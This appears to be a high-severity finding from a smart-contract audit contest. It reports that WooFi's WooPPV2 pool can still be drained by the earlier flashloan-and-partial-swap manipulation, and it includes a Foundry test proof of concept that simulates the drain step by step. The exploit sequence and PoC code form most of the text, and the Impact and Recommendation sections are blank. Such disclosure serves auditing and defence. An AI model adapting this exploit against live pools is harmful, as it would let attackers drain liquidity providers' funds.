Icy Denim Cougar

high

# Pool can be drained

## Summary
The pool can be drained just as it was during the incident that occurred previously.
## Vulnerability Detail
`maxNotionalSwap` and `maxGamma` and the new math formula do not prevent the pool being drainable. Same attack vector that happent previously is still applicable:
https://woo.org/blog/en/woofi-spmm-exploit-post-mortem
https://rekt.news/woo-rekt/

Flashloan 99989999999999999990000 (99_990) WOO
Sell WOO partially (in 10 pieces) assuming maxGamma | maxNotionalSwap doesnt allow us to do it in one go
Sell 20 USDC and get 199779801821639475527975 (199_779) WOO
Repay flashloan, pocket the rest of the 100K WOO.

**Coded PoC:**
```solidity
function test_Exploit() public {
        // Flashloan 99989999999999999990000 (99_990) WOO
        // Sell WOO partially (in 10 pieces) assuming maxGamma | maxNotionalSwap doesnt allow us to do it in one go
        // Sell 20 USDC and get 199779801821639475527975 (199_779) WOO
        // Repay flashloan, pocket the rest of the 100K WOO. 

        // Reference values: 
        // s = 0.1, p = 1, c = 0.0001 

        // bootstrap the pool 
        uint usdcAmount = 100_0000_0_0000000000000_000;
        deal(USDC, ADMIN, usdcAmount);
        deal(WOO, ADMIN, usdcAmount);
        deal(WETH, ADMIN, usdcAmount);
        vm.startPrank(ADMIN);
        IERC20(USDC).approve(address(pool), type(uint256).max);
        IERC20(WOO).approve(address(pool), type(uint256).max);
        IERC20(WETH).approve(address(pool), type(uint256).max);
        pool.depositAll(USDC);
        pool.depositAll(WOO);
        pool.depositAll(WETH);
        vm.stopPrank();
        ////////////////////////

        // fund mr TAPIR
        vm.startPrank(TAPIR);
        uint wooAmountForTapir = 9999 * 1e18 - 1000;
        deal(WOO, TAPIR, wooAmountForTapir * 10);
        IERC20(USDC).approve(address(router), type(uint256).max);
        IERC20(WOO).approve(address(router), type(uint256).max);
        IERC20(WETH).approve(address(router), type(uint256).max);
        vm.stopPrank();
        ////////////////////////
        
        // get the price before the swaps
        (uint128 price, ) = oracle.woPrice(WOO);
        console.log("Price before the swap", price);

        // here, we assume maxGamma and maxNotionalSwap can save us. However, due to how AMM behaves
        // partial swaps in same tx will also work and it will be even more profitable! 
        uint cumulative;
        for (uint i; i < 10; ++i) {
            vm.prank(TAPIR);
            cumulative += router.swap(WOO, USDC, wooAmountForTapir, 0, payable(TAPIR), TAPIR);
        }

        // how much we bought and what's the final swap? 
        console.log("USDC bought after swaps", cumulative);
        (price, ) = oracle.woPrice(WOO);
        console.log("Price after swap", price);

        // sell 20 USDC, how much WOO we get? (199779801821639475527975)
        vm.prank(TAPIR);
        uint receivedWOO = router.swap(USDC, WOO, 20 * 1e6, 0, payable(TAPIR), TAPIR);
        console.log("Received WOO", receivedWOO); // 199779801821639475527975 (10x)
        console.log("Total WOO flashloaned", wooAmountForTapir * 10); // 99989999999999999990000

        // attack is succesfull 
        assertGe(receivedWOO, wooAmountForTapir * 10);
    }
```
## Impact

## Code Snippet
https://github.com/sherlock-audit/2024-03-woofi-swap/blob/65185691c91541e33f84b77d4c6290182f137092/WooPoolV2/contracts/WooPPV2.sol#L420-L465
## Tool used

Manual Review

## Recommendation
